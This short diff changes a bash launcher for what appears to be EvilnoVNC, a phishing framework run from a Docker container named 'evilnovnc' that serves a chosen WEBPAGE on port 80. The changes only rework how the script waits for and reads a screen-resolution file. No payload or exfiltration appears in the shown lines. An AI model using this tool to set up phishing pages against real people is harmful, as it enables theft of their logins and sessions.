@@ -39,7 +39,6 @@ if ! (( $(ps -ef | grep -v grep | grep docker | wc -l) > 0 )) ; then
 sudo service docker start > /dev/null 2>&1 ; sleep 2 ; fi ; fi
 
 if [[ $RESOLUTION == dynamic ]]; then
-sudo rm -f /tmp/res*.txt > /dev/null 2>&1
 sudo docker run --cap-add=SYS_ADMIN --device /dev/dri -d --rm -p 80:80 -v "/tmp:/tmp" -v "${PWD}/Downloads":"/home/user/Downloads" -e "WEBPAGE=$WEBPAGE" --name evilnovnc joelgmsec/evilnovnc > /dev/null 2>&1
 
 else echo $RESOLUTION > /tmp/resolution.txt
@@ -50,9 +49,10 @@ printf "\n\e[1;34m[+] URL: http://localhost" ; sleep 2
 printf "\n\e[1;31m[!] Press Ctrl+C at any time to close!" ; sleep 2
 
 if [[ $RESOLUTION == dynamic ]]; then
+RESOLUTION=$(head -1 /tmp/resolution.txt 2> /dev/null)
 printf "\n\e[1;32m[+] Waiting for any user interaction.." ; sleep 2
-while [[ ! -f /tmp/resolution.txt ]]; do sleep 5 ; done
-RESOLUTION=$(head -1 /tmp/resolution.txt)
+while [[ $RESOLUTION == "" || $RESOLUTION == dynamic ]]; do sleep 1
+RESOLUTION=$(head -1 /tmp/resolution.txt 2> /dev/null) ; done
 
 else printf "\n\e[1;32m[+] Avoiding dynamic resolution steps.." ; sleep 2 ; fi
 printf "\n\e[1;34m[+] Desktop Resolution: $RESOLUTION" ; sleep 2
